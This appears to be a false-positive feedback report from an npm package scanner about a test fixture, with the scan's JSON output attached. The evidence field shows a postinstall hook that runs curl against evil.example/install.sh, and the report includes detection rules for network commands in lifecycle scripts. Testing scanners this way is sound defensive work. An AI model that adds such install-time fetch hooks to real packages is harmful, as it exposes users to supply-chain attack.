## False Positive Feedback

- Package: `postinstall-curl-example`
- Ecosystem: `npm`
- Version: `1.0.0`
- Decision: `warn`
- Risk score: `65`
- Rule IDs: `lifecycle_script_present, missing_license, missing_repository, network_command_in_lifecycle`
- Fingerprint: `10059d15ee2bdda09fc21dcd657950d59908763922c0369cce0dff7bae1a3904`
- Lifecycle scripts involved: `true`
- Private registry involved: `false`
- Command used: `pkgsafe scan-local-npm testdata/npm/postinstall-curl --json`

### Why This Is Believed Safe

Maintainer and source reviewed; lifecycle script is expected for this fixture.

### Sanitized Scan Output

```json
{
  "artifact_analysis": {
    "setup_py_present": false,
    "source_distribution_available": false,
    "wheel_available": false,
    "yanked": false
  },
  "behavior_analysis": {
    "enabled": false,
    "executed": false,
    "isolated": false,
    "mode": "disabled",
    "network_policy": "disabled",
    "not_performed": true,
    "reason": "behavior analysis disabled by policy"
  },
  "decision": "warn",
  "ecosystem": "npm",
  "enforcement": "User review recommended",
  "exception": {
    "matched": false
  },
  "lifecycle_scripts": [
    "postinstall"
  ],
  "mode": "warn",
  "package": "postinstall-curl-example",
  "package_identity": {
    "ecosystem": "npm",
    "name": "postinstall-curl-example",
    "version": "1.0.0"
  },
  "policy": {
    "name": "default",
    "owner": "local",
    "source": "local",
    "version": "0.1.0"
  },
  "reasons": [
    {
      "evidence": "postinstall=curl https://evil.example/install.sh",
      "message": "Package defines a postinstall script",
      "rule_id": "lifecycle_script_present",
      "score": 20,
      "severity": "medium"
    },
    {
      "evidence": "curl",
      "message": "Lifecycle script uses curl",
      "rule_id": "network_command_in_lifecycle",
      "score": 30,
      "severity": "high"
    },
    {
      "message": "Package metadata does not include a source repository",
      "rule_id": "missing_repository",
      "score": 10,
      "severity": "low"
    },
    {
      "message": "Package metadata does not include a license",
      "rule_id": "missing_license",
      "score": 5,
      "severity": "low"
    }
  ],
  "recommended_action": "Review package before installing.",
  "registry": {
    "auth_method": "",
    "name": "local",
    "type": "",
    "url": ""
  },
  "risk_score": 65,
  "suspicious_patterns": [
    "curl"
  ],
  "thresholds": {
    "allow_max_score": 29,
    "block_min_score": 70,
    "warn_max_score": 69
  },
  "trust": {
    "matched": false
  },
  "version": "1.0.0"
}
```
